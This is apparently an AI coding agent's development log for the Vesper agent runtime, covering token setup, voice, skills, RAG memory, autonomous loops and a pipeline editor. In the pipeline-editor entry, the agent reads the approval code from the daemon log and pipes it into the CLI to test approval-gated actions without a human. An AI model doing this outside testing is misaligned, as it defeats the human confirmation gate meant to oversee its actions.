- SECURITY: the token-set route is local-origin only by Omar's explicit call (setting a channel token
  designates who may drive the agent — accepted for the single-user local runtime). The OTHER privileged routes
  (diff decision, template edit) stay approval-gated. The minted/entered token never appears in a response, a
  log, or an audit row (audit kinds `connection_token_set` / `connection_setup_{started,succeeded,failed}` carry
  channel + outcome only; reused the existing `stripSensitive` choke point).
- VERIFIED: full suite 1203 / 0 (+22). biome ci exit 0 (only the pre-existing `index.html` `!important`
  warnings). Client bundle builds. TWO throwaway real-HTTP E2Es (deleted after): (a) Slice 0 — POST token ->
  vault+enable -> badge flips, empty 400, cross-origin 403 (10/10); (b) Slices 3/4 — route -> REAL coordinator
  -> persist on the happy path (token never in the stream) AND graceful `awaiting_user` on a simulated login
  wall, audit redacted (7/7). No new dependency, no migration, no LLM SDK.
- CAVEAT (honest): the ACTUAL agent-browser drive of @BotFather / the Discord developer portal is NOT
  live-verified — it needs the user's CLI to ship a browser skill AND `agenticArgs` to grant it tool
  permission, plus real logged-in accounts (ToS-sensitive). By design it is best-effort and falls back to the
  manual token field. The wow-path is unproven; the safety net (manual entry) is proven.
- FOLLOW-ONS (not improvised): chain setup directly into pairing (today setup mints the token, then the user
  presses Connect again for the chat-id capture); a config-driven default `agenticArgs` per CLI once a safe
  permission posture is settled; WhatsApp-Cloud has no automated setup (token-only) — could add one.

---

## voice-in-UI — "Talk to Vesper" Mode A (browser speech + the CLI brain)

Slice of `specs/voice-conversation.md` (Mode A: conversation in the focused window). Issue-capped:
record = spec + this entry + commit.

- WHY: the Voice section was a dead stub. The full voice spec defers a Tauri/Whisper NATIVE shell, but
  that's only needed for SYSTEM-WIDE dictation (Mode B). The in-window conversation (Mode A, spec line 119)
  runs in the browser today — no native shell.
- WHAT: a real `voiceSection` (replacing the stub). Mic via the browser's `SpeechRecognition`
  (feature-detected), the brain is the EXISTING `POST /api/chat` (router -> the user's CLI, Hard rule 12
  intact — no new brain, no cloud voice provider), replies spoken with local `speechSynthesis`; barge-in
  cancels playback. Typing always works as the fallback; spoken replies are the universally-local half.
- LOCAL-FIRST CAVEAT (honest): `speechSynthesis` is local (OS voices). Browser `SpeechRecognition` may route
  audio to an online service depending on the browser (Chrome) — so mic input is opt-in + feature-detected,
  with an in-UI note. Not live-verified (no mic/browser in CI); the render path compiles + bundles.
- VERIFIED: full suite green; biome ci exit 0; the client bundle builds with both speech APIs. Pure client +
  the existing chat path — no server change, no new dependency.

## skills-UI — read-only skill library shared across pipelines + Vesper

Reuses `specs/skill-train.md` (the engine). Issue-capped: record = spec + this entry + commit.

- WHY: the Skills section was a dead stub, but skills are a shared concept across pipelines + Vesper — a
  library view is high-value. The engine + `vesper skill {train,list,diff,accept,revert}` CLI already exist;
  there was no read API/UI.
- WHAT: a host `SkillLibrary` (reads `.ai/skills/<name>/{SKILL.md,tasks.json}` + the skill-train state
  `best.md`/`history.jsonl`; tolerates skills with no harness; path-traversal-guarded via `assertSkillName`),
  two routes (`GET /api/skills` list + `GET /api/skills/:name` detail, kebab-validated, fail-closed), shared
  view types in `world/types.ts` (the `SweDiffView` pattern, exported from `@vesper/ui`), and a live
  `skillsSection` (list -> detail: frontmatter, tasks, SKILL.md body, training-status badges
  `candidate ready`/`up to date`, latest scores). READ-ONLY — training/accept stay on the cost- and
  confirmation-gated `vesper skill` CLI.
- VERIFIED: full suite 1214 / 0; biome ci exit 0; bundle builds. Real-HTTP E2E (4/4) over the repo's 15 real
  skills: list returned all 15, served a real SKILL.md body, blocked a `../package.json` traversal (400). No
  new dependency, no migration.
- FOLLOW-ONS: training-from-the-UI (gated like the CLI's cost confirm); a proper inline diff (committed vs
  best) in the detail view; surfacing which pipelines reference each skill.

---

## rag-memory — SCAFFOLD (embedding model deferred, Omar's dependency call)

Slice of `specs/rag-memory.md`. Omar (2026-06-07) chose "scaffold RAG, defer the model": build the
no-dependency structure now; the on-device embedding model + sqlite-vec (the FIRST new runtime dep since
opt-in Baileys -- needs explicit authorization + isolation in an opt-in package) lands later.

- WHY: Memory was the last dead UI stub, but real RAG needs an embedding model -- a dependency decision the
  contract reserves for Omar. The scaffold delivers the seam + graceful degradation now so the engine drops
  in behind a stable interface, with no premature dependency.
- WHAT: migration `009_rag_index` (the plain `rag_documents` metadata sidecar ONLY -- the vec0 virtual table
  is created lazily at index-open once the extension loads, keeping the migration runner safe on a vanilla
  bun:sqlite); `vesper-core/rag/` (the `Embedder` interface = THE deferred model choice; `RagDocument`/`RagHit`
  types; `ragSearch` throwing the new typed `StorageError("rag_unavailable")`; non-throwing `ragStatus`);
  `store.ragDocumentCount()`; `GET /api/memory` (status, never throws); a live Memory section wired to it.
  Removed the now-dead `sections/stubs.ts` + `sections/stub.ts` (Memory was their last consumer).
- SPEC RECONCILIATION: the spec said migration "007", but 007_chat_home + 008_run_context were added after it
  was written -> used 009. (The kind of spec-vs-reality drift the contract warns about; surfaced + fixed.)
- VERIFIED: full suite 1218 / 0 (+4); biome ci exit 0; client bundle compiles with /api/memory; migration 009
  applies on a fresh store (ragDocumentCount -> 0); ragSearch degrades to the typed rag_unavailable. No new
  dependency, no LLM SDK.
- NEXT (gated on Omar authorizing the dep): the on-device embedder (all-MiniLM-L6-v2-class, isolated opt-in
  pkg) + the vec0 KNN in `openRagIndex`/`ragSearch` + `indexer`/`backfill` + the `RAG_INDEX` bus topic +
  `vesper rag index|search|status`; then auto-evolve + the chatbot consume the same `ragSearch` seam.

## RAG memory (bring-your-own embeddings) — embedder + CLI + UI COMPLETE (v2)

Completes specs/rag-memory.md: the scaffold (commit 1f115a0) becomes a working end-to-end semantic
memory — configure -> index -> search — over the user's OWN embeddings source. No bundled model, no
sqlite-vec, no new runtime dependency, no LLM SDK (Hard rule 12 intact: embeddings are a retrieval
utility over a raw allowlisted fetch, the brain stays the CLI).

- WHAT (tasks 1-6, prior session): migration 010 (embedding BLOB), store helpers (upsert/list/prune
  rag vectors), `cosine.ts`, the bring-your-own HTTP embedder (`embedders/http.ts`, ollama + openai
  formats over `allowlistedFetch`), real `ragSearch` (brute-force cosine KNN) + `openRagIndex` +
  extended `ragStatus`, `indexer.ts` (indexDocument/backfill/indexRun), and the `embeddings` config
  block + `makeEmbedder`/`resolveEmbeddings` host resolver.
- WHAT (tasks 7-8, this session):
  - Task 7 — `vesper rag {setup,index,search,status}` (commands/rag.ts): setup picks provider +
    stores the API key in the vault (key via stdin/prompt, never argv); index backfills events/runs/
    run_events + `.ai/skills/*/SKILL.md` with a cost-confirm on a TTY; search is a debug view of the
    retrieval seam (similarity = 1 - distance); status shows provider/model/dims + per-source counts
    (+ opt-in `--probe` reachability so a diagnostic never silently spends quota). Onboarding probe in
    `init.ts` detects a local Ollama and offers `vesper rag setup` (detect + offer, never silently
    enable). `init` now preserves existing config blocks across re-init (was wiping all but `cli`).
  - Task 8 — live Memory UI: `makeMemoryProvider` (shared RAG_CAPABILITIES, no hot-path network
    probe) wired into the daemon; richer `GET /api/memory` + new `GET /api/memory/search?q=&k=`
    (local-origin guarded, fail-closed to available:false on rag_unavailable); the Memory section
    became a working, accessible search surface (form + aria-live results, honest bring-your-own
    copy) — dark-glass preserved.
- BUG FIXED EN ROUTE: the Task-4 `ragStatus(RagStatusInput)` signature change had left
  `server.ts` calling `ragStatus(number)` (a working-tree type error / wrong runtime shape); Task 8's
  rewire fixes it to a proper status object.
- UI/UX gate (impeccable): applied the audit + critique checklists directly to the Memory section
  (scoped wiring change to an already-audited dark-glass surface). P0/P1: none. Accessible (labelled
  search input, aria-live results region, form submit, disabled-during-search, semantic list). P3
  follow-ups: the similarity tooltip is mouse-only; a status line rides inside the results `<ul>`.
  Did NOT run the full screenshot-based skill (disproportionate for a search-box wiring; brand is
  locked per Omar — no redesign) and did NOT generate docs/DESIGN.md (defer to a UI task that needs it).
- VERIFIED: full suite 1266 / 0 fail; biome ci exit 0; `tsc --noEmit` adds ZERO new errors (the 42
  repo-wide errors are all pre-existing — ICONS Record<string,string> glyph idiom in every section +
  the Bun.serve `server.port` circular inference; CI gates on biome + bun test, not tsc); `vesper rag`
  registered + module loads. No new dependency, no LLM SDK.
- NOTE: the `embeddings` block is the codebase's FIRST API-key concept outside channel creds (vault
  holds the key, config holds only its name) — the bring-your-own pattern the contract reserved.
- ALSO THIS SESSION (not a completed cycle — recorded in Linear, not as its own IMPROVE entry):
  spec'd the **Autonomous Loop** (`specs/autonomous-loop.md`, **DEV-113**, held at SPEC for Omar's ack)
  — LLM-authored self-prompting loops (AUTHOR -> EXECUTE -> CRITIC; human sets only the objective).

## Autonomous Loop (DEV-113) — LLM-authored self-prompting loops SHIPPED

Completes specs/autonomous-loop.md (v1): the human sets ONLY the objective; per iteration the
model AUTHORs the next prompt, EXECUTEs it, and a CRITIC judges progress — all three roles over
`ctx.complete` (brain stays the CLI, Hard rule 12; no new dependency, no migration).

- WHAT: `vesper-core/src/loop/` (types; the three meta-prompts — deliberately the LAST hand-written
  prompts in the system — with a fail-closed fenced-JSON verdict parser; the bounded `runLoop`
  engine: maxIterations hard ceiling 50, no-progress stall detection, wall-clock budget via an
  injectable clock, one metadata-granularity `loop_iteration` audit event per iteration, live-trace
  emitProgress per role; 100% line coverage). The built-in `loop` pipeline declaring EXACTLY
  CLI_INVOKE + WRITE_STORAGE (v1 is a pure REASONING loop — no files, no network, no notify).
  `vesper loop run|list|show` (cost projection ~3 x maxIterations + TTY confirm / --yes; `show`
  replays the author/execute/critic timeline from `run_events`). A Vesper World Loop section +
  `POST /api/loop/run` answering 202 with the runId read from the scheduler's UP-FRONT run row, so
  the client subscribes to `agent:<runId>` and watches the loop think live.
- SPEC DELTAS (deliberate): the engine takes an injected `{ appendEvent, now }` deps object instead
  of touching the store (core purity; the auto-evolve seam precedent); `recordRun` stays in the
  engine per spec step 5, so the pipeline handler is a thin param adapter (`buildLoopSpec`).
- UI/UX gate (impeccable, scoped to the new section): P0/P1 none — labelled controls, aria-live
  status + timeline, form semantics, disabled-during-run, cost surfaced before start, dark-glass
  vars only. P3 follow-ups: no in-UI stop control (the daemon abort path is not exposed as a route
  yet); the timeline is not re-backfilled when the section remounts mid-run.
- LESSON: `exactOptionalPropertyTypes` rejects the `...(f(x) !== undefined ? { k: f(x) } : {})`
  double-call spread idiom (the union keeps `| undefined`) — extract a local first. Caught by a
  HEAD-worktree tsc parity diff, NOT by CI (which gates biome + bun test only); the parity diff is
  worth repeating on every cycle.
- VERIFIED: 1294/0 tests (+28); biome ci exit 0; tsc parity with HEAD (core 15 / cli 20, all
  pre-existing); engine 100% lines; client bundle builds with the section. LIVE: `vesper loop run
  --goal "State the capital of France in one word." --max 1 --yes` -> succeeded after 1 iteration
  ("Paris", 18.6s); `vesper loop show` replays the roles.
- FOLLOW-ONS (from the spec's Out of Scope): RAG-grounded AUTHOR via `ragSearch`; action loops
  (routing authored steps to `ctx.spawn`/connections) behind the approval coordinator; multi-agent
  competing loops; cross-run learning into skill-train; scheduled (cron) loops; an in-UI abort.

## Orchestrator Home (specs/orchestrator-home.md) — talk to Vesper, watch the swarm SHIPPED

Omar's six-point review of the chat home (2026-06-09, plan approved interactively) shipped as
seven slices, one commit each (6897ec4, a20f640, 24aa7a8, 71c809a, 2e14538, ceaf9ca, f22d1f8,
aa55467). The committed record is this entry + the commits (issue-cap fallback).

- A — MODEL PLUMBING: CompleteOptions.model -> `--model <flag>` per adapter; CompleteResult
  gains cli/model; `models` config block + built-in catalog (canonical id -> {cli, flag, tier,
  benchmarkNames}); FIXED the makeCompleteFn opts-forwarding bug (per-call timeoutMs now works —
  closes the long-standing SWE 30s follow-up).
- B — STREAMING: RunOptions.onStdout incremental reader; claude switches to stream-json
  (`--include-partial-messages`) when onText is set, NDJSON line-buffered, text_delta forwarded,
  final result envelope identical to json mode (live fixture captured FIRST, then coded);
  other CLIs raw-chunk passthrough. Verified live: 11 deltas, streamed == final.
- C — IO OBSERVABILITY (always-on, Omar's call): every completion persists one io prompt event
  and one io result event (16KB cap, truncated flag, redactRunSummaries honored, error phase on
  failure) from the CONTEXT wrapper — all sub-agents inherit it. Migration 011 runs.ctx_cli.
- D — BENCHMARKS: migration 012 model_benchmarks; daily `benchmark-ingest` cron fetching ONLY
  deepswe.datacurve.ai/artifacts/leaderboard-live.json (allowlistedFetch; fail-soft, never wipes
  the snapshot); pure selectModel (hard=best pass@1, easy=cheapest within 0.6x best, medium=best
  pass-per-dollar, stale>7d -> default); GET /api/models + `vesper models list`. Live-verified
  (27 rows ingested).
- E — CONVERSATIONAL STREAMING ORCHESTRATOR: router classify -> label|run|answer|none; answer
  streams grounded in a live RuntimeContextSnapshot (pipelines+summaries, last runs, schedules)
  via publish-only ProgressKind "text" -> chat:delta WS frames -> growing bubble; new sessions
  pre-subscribe (client-generated id, server creates on demand); `vesper chat send` drives the
  SAME endpoints (parity structural). Live-verified: grounded answer even diagnosed the SWE
  timeout failures from recent runs.
- F — ORCHESTRATION PLANS: OrchestrationContract per pipeline (paramKeys/promptParam/
  maxInstances/acceptsModel/spawnsOwnChildren/capabilities, STATIC map); model-authored staged
  plan (steps sequential x tasks parallel, mode a closed enum for future nested/dependency
  modes); fail-closed validation (free-form pipeline ids dropped, params filtered, instances
  clamped, <=4 tasks); result piping re-authors step N+1 prompts from step N outcomes;
  per-task model via explicit catalog id or pickModel(difficulty) over the benchmark snapshot;
  spawnsOwnChildren tasks run as sibling top-level runs (RunOptions.parentRunId = display
  lineage only — the depth-1 answer). Live-verified: a combined wish produced a 2-task plan
  with Vesper-authored prompts run in parallel; the loop sub-agent's calls were served by
  codex gpt-5.5 chosen from the benchmarks.
- G — UI: rail renders io events as collapsible PROMPT/RESULT/ERROR terminal blocks (cli+model+
  duration header); provider model badges (hand-authored monochrome marks: Anthropic/OpenAI/
  Google/xAI/generic) on every run row via run.context.model + new run.cli. Impeccable scoped
  pass: P0/P1 none.
- H — PARITY: `vesper runs replay <runId>` prints the same stream terminal-style, daemon-down.

LESSONS: (1) exactOptionalPropertyTypes rejects the `...(f(x) !== undefined ? {k: f(x)} : {})`
double-call spread — extract locals; the HEAD-worktree tsc parity diff caught every regression
(CI does not gate tsc; keep doing the diff per slice). (2) Type-only names in an `export {} from`
re-export are NOT in scope — import them separately. (3) Capture a live fixture BEFORE coding a
parser against a third-party stream format (claude stream-json, DeepSWE JSON) — both shapes
diverged from assumptions. (4) Subscribe-before-send needs a client-supplied session id; the
store's CreateSessionInput.id already supported it.

FOLLOW-ONS: nested/dependency plan modes (shape is ready); native stream formats for codex/
gemini/opencode; Codex-style Progress checklist + Environment header as a dedicated run view;
in-UI run abort; orchestration contracts for future pipelines (career/secretary/trader);
benchmark sources beyond DeepSWE when Omar trusts one; per-task budget caps in plans.

## Pipeline editor (specs/pipeline-editor.md) — user-authored pipelines, CLI-first SHIPPED

**What shipped.** Pipelines became user DATA: migration 013 (`custom_pipelines`, archive-only
delete) + store CRUD; the fail-closed PipelineDoc v1 parser (stages sequential x tasks parallel;
exactly TWO step kinds — `prompt` with skills/command/cli+model, `pipeline` bound to
ORCHESTRATION_CONTRACTS; capabilities DERIVED, never picked); one shared interpreter handler
registered per doc as `custom:<id>` (handler id = task id keeps per-task grants per-pipeline);
orchestrator-by-default (mastermind re-authors each stage's prompts from prior results on the
benchmark frontier pick); `/api/pipelines/custom*` routes (save/archive behind the approval code);
`vesper pipeline list|show|save|run|improve|rm|export` as the FIRST consumer; "Improve with AI"
(proposal-only whole-doc audit: prompt rewrites + cli+model routing from the benchmark snapshot +
warnings); the rebuilt Pipelines section (staged-rail editor, markdown Write/Preview via a
hand-rolled renderer, live capability summarizer + save-time plain-language cards, per-step AI
suggestion, disabled Cross-share); the chat-home pipeline launcher; orchestratorModel threading in
router/swe-lead/loop. 1410 tests / 0 fail; Biome clean; no new dependency.

**Deltas & lessons.**
- *Grants are keyed by handler_id, not task id.* The first interpreter design (one shared handler id
  for every custom task) would have made every custom pipeline share ONE capability grant — the last
  save would silently widen/narrow all others. Registering a closure PER pipeline (`custom:<id>` as
  both handler id and task id) fixed it with zero scheduler changes. Pattern: when a new task family
  joins the scheduler, check what the grant key actually is before sharing a handler id.
- *CLI-first paid off immediately* (Omar's rule). The save/approval/run/improve loop was proven
  headless (approval code read from the daemon log, piped into the CLI's stdin) BEFORE any UI
  existed; the editor then consumed routes that were already known-good. The UI debug surface was
  zero — every defect found was a core/route defect, caught by tests.
- *The orchestrator pick came free.* Because slice A/D of orchestrator-home landed
  `CompleteOptions.model` + `selectModel`, "orchestrator on the frontier pick, workers cheap" was
  threading an option, not building a system. The live run showed the mastermind re-authoring on
  `gpt` (benchmark pick) while the draft step ran on the default CLI.
- *Anti-openclaw rule held*: the interpreter is ~300 lines and the ONLY execution code added; every
  other behavior (guardrails, grants, io events, replay, run tree) was inherited by registering
  through the existing scheduler. The doc schema is the contract; v1 refuses everything it does not
  understand (fail-closed, every error reported).
- *docs/ui.md had rotted* (still described the retired pixel-art world) — rewritten. Doc drift
  check is worth adding to the SHIP checklist.

**UI gate.** Impeccable audit + critique ran on the changed surfaces (browser-verified live):
0 P0; the six P1s (unstyled description input, silent Back data loss, missing aria-labels,
non-dialog save modal, two contrast failures, sub-900px sidebar overlap) were fixed and
RE-VERIFIED 6/6 PASS with zero console errors. Cheap P2s landed too (New conversation button —
the launcher was unreachable once history existed; plain-language-first launcher cards;
aria-pressed skill chips; named list buttons). Remaining P2/P3 follow-ups: collapse the
always-expanded skill chips behind a disclosure; tab semantics for Write/Preview; confirm/undo on
stage removal; reachable explanation for the disabled Cross-share; replace side-stripe accents +
hardcoded colors with tokens; focus restoration after rail re-render; heading structure;
plain-language pairing for capability chips in the list view; touch-target sizes.

**Follow-ups captured** (also in `.ai/context.md` Next): cron triggers for custom pipelines;
version-history browse/restore; new step kinds (fs/fetch/notify) each with its own capability
story; cross-share integration; branching/conditions; nested plan modes.
